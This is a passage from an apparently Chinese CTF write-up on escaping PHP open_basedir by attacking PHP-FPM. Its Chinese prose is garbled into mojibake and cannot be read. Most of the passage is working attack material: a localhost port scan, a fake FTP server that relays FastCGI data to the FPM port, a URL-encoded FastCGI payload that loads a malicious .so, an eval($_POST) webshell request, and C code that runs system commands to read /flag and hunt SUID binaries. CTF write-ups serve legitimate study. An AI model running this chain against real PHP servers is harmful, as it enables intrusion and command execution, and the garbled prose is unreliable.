&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>æ‰¾åˆ°äº†fpmç«¯å£11451&lt;/p>
&lt;p>ä¹‹åå°±ç»­ä¸Šäº†æˆ‘ä»¬å‰é¢çš„æ€è·¯ï¼Œå…ˆåœ¨æœ¬åœ°ï¼ˆä¹Ÿå°±æ˜¯é¶æœºçš„æœ¬åœ°ï¼‰èµ·ä¸€ä¸ªæ¶æ„çš„ftp_serveræœåŠ¡ç”¨æ¥è½¬å‘FTP-DATAï¼ˆå³.soæ–‡ä»¶ï¼‰è‡³fpmç«¯å£ï¼ˆ11451ï¼‰ï¼›è¿™é‡Œçš„expæ˜¯phpç‰ˆçš„ï¼ŒåŸç†è·Ÿä¸Šé¢çš„pyç‰ˆæ˜¯ä¸€æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencodeä¹‹åä¼ å…¥ï¼Œå†æ‰«ä¸€ä¸‹ç«¯å£å¯ä»¥çœ‹åˆ°46819å¼€æ”¾ï¼Œè¯´æ˜æœåŠ¡æ­£å¸¸ï¼›è¿˜æ˜¯ç”¨ä¹‹å‰pç‰›çš„è„šæœ¬æ„é€ ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹çš„é…ç½®é¡¹æ˜¯è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so',
&lt;/code>&lt;/pre>&lt;p>è¦†ç›–æ‰open_basedirçš„åŸæœ‰è®¾ç½®ï¼Œå†åŠ ä¸Š.soæ–‡ä»¶ï¼ˆç¨åä¸Šä¼ ï¼‰ï¼›å…·ä½“çš„payloadä¹Ÿå¯ä»¥ç”¨pç‰›çš„è„šæœ¬é­”æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>æ³¨é‡Šæ‰157-159å¯¹è¿æ¥çŠ¶æ€çš„åˆ¤æ–­ï¼Œåœ¨191åˆ›å»ºè¿æ¥å‰å°†requestéƒ¨åˆ†ç›´æ¥è¾“å‡ºurlencodeçš„ç‰ˆæœ¬ç„¶åexit(0)ä¸€æ³¢é€€å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode('%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00');var_dump(file_put_contents('ftp://127.0.0.1:46819/wuhu',$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>å†™æ¶æ„.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ .so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>è¯•ç€æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸè§£é™¤open_basedirçš„é™åˆ¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>ä½†æ˜¯ä¸€æ ·çš„æ“ä½œä¹‹åå°±æ‰§è¡Œä¸äº†äº†â€¦â€¦å°±ä¸Šé¢è¿™ä¸ªé¡µé¢ï¼Œå°±æ­£å¸¸å‡ºæ¥äº†ç¬¬ä¸€æ¬¡ï¼Œç„¶åå°±ä¸è¡Œäº†ï¼Œéå¸¸çš„ç¦»è°±å•Šå•Šå•Šå•Šå•Š&lt;/p>
&lt;p>æ­£å¸¸æ¥è¯´ï¼Œåªæœ‰open_basedirè¢«è§£æ”¾åæ‰å¯ä»¥scandir('/')ï¼ˆæ²¡æœ‰çš„è¯æ˜¯åªå¯ä»¥scandir('/var/www/html')ï¼‰ï¼Œè€Œæ—¢ç„¶è¿™æ ·å¯ä»¥æ‰§è¡ŒæˆåŠŸå°±è¯´æ˜å¼€å§‹çš„fpmæµé‡ä¸€å®šè¢«æ­£å¸¸æ‰“å‡ºå»äº†ï¼Œå†åŠ ä¸Š.soä¹Ÿè¢«å†™å…¥ï¼ˆæˆ‘åˆ°dockerä¸Šçœ‹äº†ï¼‰ï¼Œé‚£ä¹ˆ.soä¸€å®šä¼šåœ¨phpæ‰§è¡Œæ—¶è¢«è§¦å‘ï¼Œä¸€å®šæ˜¯å¯ä»¥æ‰§è¡Œ.soä¸­æˆ‘ä»¬å†™çš„å‘½ä»¤çš„ï¼›ä½†æ˜¯ç°åœ¨ç«Ÿç„¶è¿scandir('/')éƒ½åªèƒ½æ‰§è¡Œä¸€æ¬¡ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿåé¢å°±éƒ½å¤±è´¥äº†ï¼Œæ›´ä¸è¦è¯´.soä¸­çš„å‘½ä»¤äº†ï¼Œè‚¯å®šæ›´æ˜¯æ²¡æœ‰æ‰§è¡Œ&lt;/p>
&lt;p>ä¹‹ååˆå°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œ.soæ­£å¸¸ä¸Šä¼ ï¼Œæœ€å¼€å§‹æ‰“å‘fpmçš„æµé‡ä¹Ÿåˆæ‰“äº†å‡ éï¼Œå¤±è´¥ï¼›å†ä¹‹å.soä¹Ÿä¸èƒ½æ­£å¸¸ä¸Šä¼ äº†ï¼Œæœ€åˆçš„é‚£ä¸ªæµé‡ä¹Ÿæ‰“ä¸æˆäº†ï¼Œåªèƒ½å›æ˜¾int(xxx)ï¼Œä½†æ˜¯æ²¡æœ‰eval()çš„å›æ˜¾ï¼Œè¯´æ˜è¿˜æ˜¯ä¸æ­£å¸¸ï¼Œç„¶åä»–å¦ˆçš„ï¼Œé—´æˆ–æœ‰ä¸€ä¸¤æ¬¡èƒ½æˆåŠŸï¼Œç”šè‡³æˆ‘éƒ½åˆåœ¨/tmpç›®å½•ä¸‹å†™äº†åˆ«çš„æ–‡ä»¶ï¼ˆå¦‚æœå‰é¢çš„æµé‡æ²¡æ­£å¸¸æ‰“å‡ºå»çš„è¯æ˜¯ç»å¯¹ä¸å¯èƒ½åšåˆ°çš„ï¼Œè‚¯å®šæ˜¯bool(false)ï¼‰ï¼Œä½†æ˜¯ä½†æ˜¯ä½†æ˜¯åˆæ˜¯ä¸€ç§’ç ´åŠŸï¼ŒçœŸæ˜¯ä¸ç†è§£äº†ï¼Œå®Œå…¨æ˜¯è·Ÿå‰é¢ä¸€æ¨¡ä¸€æ ·çš„payloadï¼Œä½†æ˜¯å°±ä»–å¦ˆç„å­¦ï¼Œåäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>ä¸æƒ³å†è€—å¤ªå¤šæ—¶é—´åœ¨è¿™ä¸ªé¢˜ä¸Šäº†ï¼Œå®åœ¨æ˜¯ç»·ä¸ä½äº†ï¼ˆè°ƒäº†å¿«1å¤©äº†ï¼‰ï¼ŒåŸºæœ¬ä¹Ÿç®—æ˜¯æ‰“é€šäº†ï¼ˆæ¯•ç«Ÿå°±å·®ä¸€ç‚¹ç‚¹å•Šå•Šå•Šå•Šå•Š æˆ‘æˆªå›¾è¿˜æœ‰å‘¢ï¼‰ï¼ˆå…¶å®æ˜¯æ‡’çš„é‡ç½®dockerå†å°è¯•äº† æˆ‘çš„ï¼‰ï¼Œæˆ‘çŒœæµ‹å‡ºé”™çš„ç‚¹åœ¨äºé‚£ä¸ªå¼€åœ¨46819ç«¯å£çš„ftpæœåŠ¡å™¨ä¸ç¨³å®šï¼Œå®ƒåœ¨å¤„ç†è¿™è¾¹ftpæ‰“å‡ºçš„æµé‡æ—¶å¯èƒ½æ²¡æœ‰æ­£å¸¸çš„å¤„ç†ï¼Œå†åŠ ä¸Šæ¥å›è°ƒæ•´payloadæ‰“äº†å¤ªå¤šæ¬¡äº†ï¼Œå¯èƒ½ä¹‹å‰çš„é”™è¯¯ç´¯ç§¯åˆ°åé¢ï¼Œæ¯”å¦‚æŸæ¬¡æ²¡æœ‰urlencodeä¹‹ç±»çš„ï¼Œæå¾—ç¯å¢ƒä¹Ÿä¸æ­£å¸¸äº†&lt;/p>
&lt;h4 id="è“å¸½æ¯-2021one-pointer-php">***[è“å¸½æ¯ 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysyï¼Œç¡®å®æ²¡æ—¶é—´å¤ç°ï¼ˆå¤ç°èµµæ€»çš„é¢˜è®©æˆ‘æœ‰å¿ƒç†é˜´å½±äº†ï¼‰&lt;/p>
&lt;p>æˆ‘å°±å…ˆäº‘ä¸€ä¸‹ï¼Œå¯¹8èµ·&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="æ”»å‡»unix-socketæ¨¡å¼ä¸‹çš„php-fpm">æ”»å‡»unix socketæ¨¡å¼ä¸‹çš„php-fpm&lt;/h3>
&lt;p>ç”±äºunix socketæ˜¯è¯»å–/run/php/php7.4-fpm.sockè¿›è¡Œå†…éƒ¨é€šä¿¡ï¼Œé‚£å¿…ç„¶æ˜¯ä¸èƒ½æ‰“è¿œç¨‹ï¼Œç”¨çš„æ˜¯&lt;code>stream_socket_client&lt;/code>å»ºç«‹ä¸€ä¸ªunix socketè¿æ¥ï¼Œç„¶åå†™å…¥tcpæµæ¥é€šä¿¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>å‰é¢çš„pwnéƒ¨åˆ†æˆ‘æ˜¯ä¸å¤ªèƒ½çœ‹æ‡‚ï¼ˆè‡³å°‘ç›®å‰ï¼‰ï¼Œå°±ç®€å•è¯´è¯´åé¢çš„webéƒ¨åˆ†ï¼›&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">è¿™é‡Œæ˜¯å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>ä»phpinfoå¯ä»¥çœ‹åˆ°disable_functions&lt;/p>
